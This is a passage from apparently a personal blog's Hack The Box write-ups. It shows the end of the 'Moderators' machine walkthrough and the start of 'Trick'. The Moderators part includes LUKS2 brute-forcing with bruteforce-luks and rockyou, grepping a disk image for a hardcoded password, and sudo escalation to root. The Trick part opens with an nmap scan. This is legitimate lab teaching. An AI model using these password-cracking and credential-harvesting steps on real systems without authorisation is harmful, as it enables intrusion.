</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;AudioAdapter</span> <span style="color:#a6e22e">codec=</span><span style="color:#e6db74">&#34;AD1980&#34;</span> <span style="color:#a6e22e">driver=</span><span style="color:#e6db74">&#34;DirectSound&#34;</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#a6e22e">enabledIn=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;RTC</span> <span style="color:#a6e22e">localOrUTC=</span><span style="color:#e6db74">&#34;UTC&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Clipboard/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;GuestProperties&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/HostVerLastChecked&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;6.1.34&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117437893678100&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/Revision&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;150636&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198406&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/Version&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;6.1.34&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198404&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/VersionExt&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;6.1.34&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198405&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/MAC&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;08002799F7EC&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151105&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/Name&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;enp0s3&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151107&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/Status&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Up&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151106&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/V4/Broadcast&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;10.0.2.255&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151103&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/V4/IP&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;10.0.2.15&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151102&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/V4/Netmask&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;255.255.255.0&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151104&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/Count&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117646084736900&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/OS/Product&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Linux&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198400&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/OS/Release&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;5.15.0-40-generic&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198401&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/OS/Version&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198402&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/HostInfo/DekMissing&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657283915359907501&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;RDONLYGUEST&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/HostInfo/GUI/LanguageID&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;en_US&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657284945611553900&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/GuestProperties&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Hardware&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;StorageControllers&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;StorageController</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;AHCI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;AHCI&#34;</span> <span style="color:#a6e22e">PortCount=</span><span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#a6e22e">useHostIOCache=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">Bootable=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#a6e22e">IDE0MasterEmulationPort=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">IDE0SlaveEmulationPort=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">IDE1MasterEmulationPort=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">IDE1SlaveEmulationPort=</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;AttachedDevice</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;HardDisk&#34;</span> <span style="color:#a6e22e">hotpluggable=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">port=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Image</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{12b147da-5b2d-471f-9e32-a32b1517ff4b}&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/AttachedDevice&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/StorageController&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/StorageControllers&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/Machine&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/VirtualBox&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>You might need to install the extension pack from <em>

<a href="https://www.virtualbox.org/wiki/Download_Old_Builds_6_1" target="_blank">https://www.virtualbox.org/wiki/Download_Old_Builds_6_1</a></em> or any other source, to be able to decrypt the <em>.vdi</em> file.</p>
</li>
</ul>
<p>Then I can simply <em>double click</em> the file or choose <em>open with VirtualBox</em>:</p>
<p><img src="opening_vdi.png" alt="Opening VDI File"></p>
<p>Now, I need to head to <em>Moderator 1 -&gt; Settings -&gt; General -&gt; Disk Encryption</em> and uncheck enable disk encryption and then click <em>OK</em>.</p>
<p><img src="disabling_encryption.png" alt="Disabling Encryption"></p>
<p>It will prompt me to enter the password, so I&rsquo;ll enter <em>computer</em> and hit <em>OK</em>:</p>
<p><img src="entering_password.png" alt="Entering Password"></p>
<p>After that, the <em>.vdi</em> image should be decrypted and I can attach it to kali.</p>
<p>So, I need to head to <em>Tools</em> and press on <em>Add</em> button and select <em>2019.vdi</em> (by navigating to its location).</p>
<p><img src="adding_vdi.png" alt="Adding VDI"></p>
<p><img src="selecting_vdi_to_add.png" alt="Selecting VDI To Add"></p>
<p>After that, I will attach this file to my kali. I need to head to <em>Kali VM-&gt; Settings -&gt; Storage</em> then press on <em>Add hard disk</em> under the <em>Controller: SATA</em> entry and choose <em>2019.vdi</em> that I just added.</p>
<p><img src="virtual_box_kali_settings.png" alt="Virtual Box Kali&amp;rsquo;s Settings"></p>
<p><img src="attaching_vdi.png" alt="Attaching VDI File"></p>
<p>Once I click <em>OK</em> and boot my machine, I can see that the file has been mounted:</p>
<p><img src="seeing_encrypted_file.png" alt="Discovering The File Is Encrypted"></p>
<h3 id="cracking-luks2-encryption">Cracking LUKS2 Encryption</h3>
<p>However, the file appears to be encrypted again, so I need to know what type of encryption to see if I can crack it, I&rsquo;ll use <code>blkid</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo blkid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/dev/sdb: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b41603a3-442c-45a1-a71a-a93ff87e4a43&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;crypto_LUKS&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda5: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;6cfec41f-5585-48d3-a541-a78af63ba15a&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;swap&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5bb6cb92-05&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda1: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bc3a4179-0361-4041-a09e-f543948513e9&#34;</span> BLOCK_SIZE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4096&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ext4&#34;</span> PTTYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dos&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5bb6cb92-01&#34;</span>
</span></span></code></pre></div><p>The <em>.vdi</em> file is <em>/dev/sdb</em> which appears to be encrypted using 

<a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup" target="_blank"><em>LUKS</em></a>.</p>
<p>To get more information about which type of 

<a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup" target="_blank"><em>LUKS</em></a> encryption is used, I&rsquo;ll use <code>cryptsetup</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo cryptsetup luksDump /dev/sdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LUKS header information
</span></span><span style="display:flex;"><span>Version:       	<span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Epoch:         	<span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>Metadata area: 	<span style="color:#ae81ff">16384</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Keyslots area: 	<span style="color:#ae81ff">16744448</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>UUID:          	b41603a3-442c-45a1-a71a-a93ff87e4a43
</span></span><span style="display:flex;"><span>Label:         	<span style="color:#f92672">(</span>no label<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Subsystem:     	<span style="color:#f92672">(</span>no subsystem<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Flags:       	<span style="color:#f92672">(</span>no flags<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Data segments:
</span></span><span style="display:flex;"><span>  0: crypt
</span></span><span style="display:flex;"><span>	offset: <span style="color:#ae81ff">16777216</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	length: <span style="color:#f92672">(</span>whole device<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	cipher: aes-xts-plain64
</span></span><span style="display:flex;"><span>	sector: <span style="color:#ae81ff">512</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Keyslots:
</span></span><span style="display:flex;"><span>  0: luks2
</span></span><span style="display:flex;"><span>	Key:        <span style="color:#ae81ff">512</span> bits
</span></span><span style="display:flex;"><span>	Priority:   normal
</span></span><span style="display:flex;"><span>	Cipher:     aes-xts-plain64
</span></span><span style="display:flex;"><span>	Cipher key: <span style="color:#ae81ff">512</span> bits
</span></span><span style="display:flex;"><span>	PBKDF:      argon2id
</span></span><span style="display:flex;"><span>	Time cost:  <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>	Memory:     <span style="color:#ae81ff">1048576</span>
</span></span><span style="display:flex;"><span>	Threads:    <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>	Salt:       c9 <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">76</span> de 9f <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">04</span> cc d1 fe <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">47</span> dd <span style="color:#ae81ff">63</span> 
</span></span><span style="display:flex;"><span>	           fd 6d 0c 7e ac 8b 1d d8 4b <span style="color:#ae81ff">48</span> 1d <span style="color:#ae81ff">59</span> 3a 7f 6b <span style="color:#ae81ff">48</span> 
</span></span><span style="display:flex;"><span>	AF stripes: <span style="color:#ae81ff">4000</span>
</span></span><span style="display:flex;"><span>	AF hash:    sha256
</span></span><span style="display:flex;"><span>	Area offset:32768 <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	Area length:258048 <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	Digest ID:  <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Tokens:
</span></span><span style="display:flex;"><span>Digests:
</span></span><span style="display:flex;"><span>  0: pbkdf2
</span></span><span style="display:flex;"><span>	Hash:       sha256
</span></span><span style="display:flex;"><span>	Iterations: <span style="color:#ae81ff">108683</span>
</span></span><span style="display:flex;"><span>	Salt:       cd <span style="color:#ae81ff">63</span> c4 d5 <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">42</span> ab a3 a5 a9 <span style="color:#ae81ff">98</span> ea <span style="color:#ae81ff">71</span> b0 fa cb 
</span></span><span style="display:flex;"><span>	           <span style="color:#ae81ff">91</span> 4c 1a e2 a0 8b 0a cc <span style="color:#ae81ff">25</span> 7a 8a c1 <span style="color:#ae81ff">54</span> b1 <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">39</span> 
</span></span><span style="display:flex;"><span>	Digest:     <span style="color:#ae81ff">79</span> 2e <span style="color:#ae81ff">78</span> f6 a1 2c <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">46</span> 2f 3a db 4b <span style="color:#ae81ff">68</span> 8a <span style="color:#ae81ff">18</span> 8d 
</span></span><span style="display:flex;"><span>	           <span style="color:#ae81ff">22</span> 7f d4 df <span style="color:#ae81ff">26</span> f2 <span style="color:#ae81ff">19</span> e2 f1 5b aa cc <span style="color:#ae81ff">13</span> f1 be <span style="color:#ae81ff">55</span> 
</span></span></code></pre></div><p>It appears to be <em>LUKS</em> version <em>2</em> encryption, and unfortunately at the time of doing this writeup, neither <em>hashcat</em> nor <em>john</em> support cracking this type, which means that I need to use a new tool, in my case 

<a href="https://github.com/glv2/bruteforce-luks" target="_blank"><em>bruteforce-luks</em></a>.</p>
<ul>
<li>Installation: <code>sudo apt install bruteforce-luks</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo bruteforce-luks -t <span style="color:#ae81ff">1</span> -f /usr/share/wordlists/rockyou.txt /dev/sdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Tried passwords: <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>Tried passwords per second: 0.473684
</span></span><span style="display:flex;"><span>Last tried password: abc123
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password found: abc123
</span></span></code></pre></div><p>And the password is <em>abc123</em>.</p>
<p>I&rsquo;ll use <code>cryptsetup</code> to decrypt the image and then mount it, to be able to see its content:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo cryptsetup luksOpen /dev/sdb decrypted_vdi
</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#66d9ef">for</span> /dev/sdb: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ sudo mount /dev/mapper/decrypted_vdi /mnt/
</span></span><span style="display:flex;"><span>$ cd /mnt/
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:16 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">36864</span> Oct <span style="color:#ae81ff">14</span> 16:16 ..
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">16384</span> Jul  <span style="color:#ae81ff">6</span> 19:13 lost+found
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">6</span> root root  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">6</span> 19:16 scripts
</span></span></code></pre></div><h2 id="finding-johns-password-and-escalating-to-root">Finding John&rsquo;s Password And Escalating To Root</h2>
<p>The first thing I&rsquo;ll do, is to search for passwords, using a simple <code>grep -Ri pass</code>, I got the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ grep -Ri pass
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>scripts/all-in-one/distro_update.sh:passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$_THE_best_Sysadmin_Ever_&#39;</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>I can notice that <em>scripts/all-in-one/distro_update.sh</em> contains a variable <em>passwd</em> that has the value <em>$<em>THE_best_Sysadmin_Ever</em></em>. Since John is an admin according to the messages read before, I will try to run <code>sudo -l</code> command and provide this as password:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ sudo -l
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> john: 
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> john on moderators:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User john may run the following commands on moderators:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> ALL
</span></span></code></pre></div><p>John user can run <em>All</em> commands as <em>root</em>, so I&rsquo;ll escalate to root using that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john@moderators:~$ sudo su
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@moderators:/home/john# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root@moderators:/home/john# cat /root/root.txt 
</span></span><span style="display:flex;"><span>1f2**************************636
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Trick Write-Up</title>
            <link>https://mostxeon.github.io/posts/trick/</link>
            <pubDate>Fri, 28 Oct 2022 13:44:37 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/trick/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a basic tcp scan for the top <em>1000</em> ports using nmap, I got the below results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 13:47 EEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 61ff293b36bd9dacfbde1f56884cae2d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9ecdf2406196ea21a6ce2602af759a78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 7293f91158de34ad12b54b4a7364b970 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>25/tcp open  smtp    Postfix smtpd
</span></span><span style="display:flex;"><span>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
</span></span><span style="display:flex;"><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| dns-nsid: 
</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.2
</span></span><span style="display:flex;"><span>|_http-title: Coming Soon - Start Bootstrap Theme
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
</span></span><span style="display:flex;"><span>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 527.64 seconds
